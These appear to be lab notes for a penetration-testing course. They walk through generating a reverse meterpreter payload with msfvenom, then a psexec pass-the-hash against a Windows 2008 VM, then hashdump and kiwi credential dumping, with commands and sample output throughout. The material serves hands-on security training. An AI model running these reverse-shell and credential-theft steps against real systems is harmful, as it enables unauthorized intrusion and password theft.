1. Download M1 from Google Drive
2. Start:
-Kali2
-2k8dc_a2
-2k8m2_a1

3. On the Kali2 host, set a static IP 192.168.168.110
ifconfig eth0 192.168.168.110
ifconfig eth0 netmask 255.255.255.0

4. Repeat last week’s step's to gain the password hash from M2 (refer to last week's notes). You'll want to grab the 32 characters on one side of the : and the 32 characters afterwards, such as aad3b435b51404eeaad3b435b51404ee:e7bf67913f1f54abf11af55aee36b9e9

5. Generating a reverse meterpreter payload within msfvenom (Kali 2):
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.168.110 lport=7477 -f exe -o /var/www/html/payload.exe

#Then don’t forget to start a listener and restart apache

6. Copy password and hash to a text file on the Kali box for reference.
7. Stop the VM 2k8m2_a1
8. Start the VM 2k8m1
9. Determine M1’s IP
10. Perform information gathering and enumeration against M1 with nmap
11. We know the password for M2's local Administrator, let's try it against M1.
12. With SMB open, what can we use to get onto M1?  The psexec module is often used by penetration testers to obtain access to a given system that you already know the credentials for. #It was written by sysinternals and has been integrated within the framework.

#Within msfconsole:
use exploit/windows/smb/psexec
set rhost 192.168.168.101
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:e7bf67913f1f54abf11af55aee36b9e9
show options
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.168.110
set lport 7479
exploit

meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 
meterpreter > sysinfo
Computer        : M1
OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
Architecture    : x64 (Current Process is WOW64)
meterpreter > background

13. Move to a 64bit Meterpreter session:
msfconsole> use windows/local/payload_inject 
set payload windows/x64/meterpreter/reverse_tcp 
set session x
set lhost 192.168.168.110
exploit
meterpreter> hashdump

14. Now try getting the password in plaintext. If for some reason you don’t see Alice’s password within a 64 bit Meterpreter shell, you need to delete the M1 virtual and re-extract the zip file or redownload it from Google Drive. Remember, interactive logins are wiped from memory when the system restarts!
meterpreter> load kiwi
meterpreter> help
meterpreter> creds_all
